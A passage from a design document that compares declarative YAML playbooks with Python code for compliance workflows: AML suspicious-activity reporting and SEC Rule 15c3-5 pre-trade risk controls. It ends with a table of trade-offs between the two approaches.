    from: { channel: review, as: txn }
    retry: { max: 3, on: [TRANSIENT] }
    loop: continuous
    background: true
    publish: { channel: enriched-review }

  # Immediate escalation — high priority, no retry on auth failure
  - action: file-sar
    from: { channel: escalate, as: txn }
    resource: compliance-api
    priority: high
    retry: { max: 2, on: [TIMEOUT] }
    loop: continuous
    background: true
```

**Python equivalent (typical AML system):**
```python
class AMLMonitor:
    async def process_transaction(self, txn):
        score = await self.score(txn)

        if score >= 0.9:
            await self.file_sar(txn)  # What if this fails silently?
        elif score >= 0.5:
            await self.queue_for_review(txn)  # What if queue is full?
        # else: normal — but is it logged?

    async def file_sar(self, txn):
        # Suspicious Activity Report
        try:
            await compliance_api.submit(txn)
        except Exception as e:
            logger.error(f"SAR filing failed: {e}")
            # REGULATORY VIOLATION: SAR was not filed
            # Was this error surfaced? Was it retried?
            # The code says "log and continue" — is that compliant?
```

**Advantage:** The YAML makes the routing visible (fan-out with
conditions), the retry policy explicit (SARs retry on timeout, not on
auth failure), and the priority clear (SARs get `priority: high`). The
Python version has a silent `except` that could swallow a regulatory
violation. A compliance auditor reading the YAML can verify the SAR
pipeline is correct; reading the Python requires understanding
async/await, exception handling, and the queue implementation.

### Use Case 8.4: Pre-Trade Risk Controls (SEC Rule 15c3-5)

SEC Rule 15c3-5 requires broker-dealers to implement pre-trade risk
controls. The controls must be documented and the documentation must
match the implementation.

**CaseHub YAML:**
```yaml
steps:
  - action: check-order-size
    if: "${order.notional} <= ${limits.max-order-size}"

  - action: check-position-limit
    if: "${portfolio.exposure} + ${order.notional} <= ${limits.max-position}"

  - action: check-daily-volume
    if: "${daily.traded-volume} + ${order.quantity} <= ${limits.max-daily-volume}"

  - action: check-fat-finger
    if: "${order.price} >= ${market.price} * 0.9"
    if: "${order.price} <= ${market.price} * 1.1"

  - action: route-order
    resource: exchange-api
    priority: high
    retry: { max: 2, on: [TIMEOUT] }
```

**Python equivalent (typical pre-trade risk check):**
```python
class PreTradeRiskChecker:
    def __init__(self, limits: RiskLimits):
        self.limits = limits

    async def check(self, order: Order, portfolio: Portfolio,
                     daily: DailyStats, market: MarketData):
        # Order size
        if order.notional > self.limits.max_order_size:
            raise RiskLimitBreached("Order size exceeds limit")

        # Position limit
        if portfolio.exposure + order.notional > self.limits.max_position:
            raise RiskLimitBreached("Position limit exceeded")

        # Daily volume
        if daily.traded_volume + order.quantity > self.limits.max_daily_volume:
            raise RiskLimitBreached("Daily volume exceeded")

        # Fat finger — but what are the thresholds?
        # They're hardcoded here. Or in a config. Or in a database.
        # The compliance doc says 10%. Does the code match?
        if order.price < market.price * 0.9:
            raise RiskLimitBreached("Price too low (fat finger)")
        if order.price > market.price * 1.1:
            raise RiskLimitBreached("Price too high (fat finger)")

    async def route_order(self, order, portfolio, daily, market):
        await self.check(order, portfolio, daily, market)
        # But: what if someone calls exchange.create_order()
        # WITHOUT calling check() first? Nothing enforces the gate.
        for attempt in range(3):
            try:
                return await exchange.create_order(order)
            except TimeoutError:
                continue
            except Exception:
                raise
```

**Advantage:** The YAML IS the documentation. Each risk check is a
named step with a visible condition. A compliance officer reads the
YAML and sees exactly what checks run before an order is routed. The
YAML can be diffed against the compliance policy document — if the
policy says "max order size $10M" and the YAML says
`${limits.max-order-size}`, the auditor checks the config, not the
code.

The Python version has two critical compliance gaps:

1. **The gate is not enforced.** `check()` is a method that must be
   called before `route_order()`. Nothing in the language prevents
   calling `exchange.create_order()` directly, bypassing all risk
   checks. In the YAML, the steps are sequential — you can't skip
   to `route-order` without passing through the check steps.

2. **The thresholds are opaque.** The fat-finger threshold (10%) is
   hardcoded in a method buried in a class. A compliance officer
   auditing the Python must find the class, find the method, find the
   line, and verify the number. In the YAML, the condition is on the
   step — visible, diffable, reviewable without code literacy.

---

## Summary: Where YAML Wins and Where It Doesn't

| Dimension | YAML Advantage | Code Advantage |
|-----------|---------------|----------------|
| Entry barrier | Zero concepts to start | N/A |
| Composition | Orthogonal decorators, guaranteed ordering | Arbitrary composition (but error-prone) |
| Concurrency | Declarative, no threads/locks/coroutines | More flexible scheduling (custom schedulers) |
| Safety | Sandboxed by grammar, guaranteed cleanup | Can do anything (including dangerous things) |
| Tooling | Free from schema (LSP, validation, diffing) | Requires building language servers |
| Portability | Data format, multi-runtime, UI-generable | Tied to language runtime |
| Expressiveness | Limited to decorator vocabulary | Unlimited (closures, metaprogramming) |
| Performance | Interpretation overhead | Native execution (JIT, etc.) |
| Debugging | Declarative — less to debug | Imperative — step-through debuggers |
| Abstraction | Modules + parameters | Classes, functions, generics |

**The YAML wins when:**
- The audience includes non-programmers
- Safety and auditability matter more than flexibility
- Multiple runtimes or UIs need to produce/consume playbooks
- Tooling (completions, validation, diffing) is expected without investment
- The orchestration patterns fit the decorator vocabulary

**Code wins when:**
- Arbitrary computation is needed (complex data transforms, algorithms)
- The audience is exclusively programmers
- Performance is critical (tight inner loops)
- Custom abstractions beyond the decorator set are required
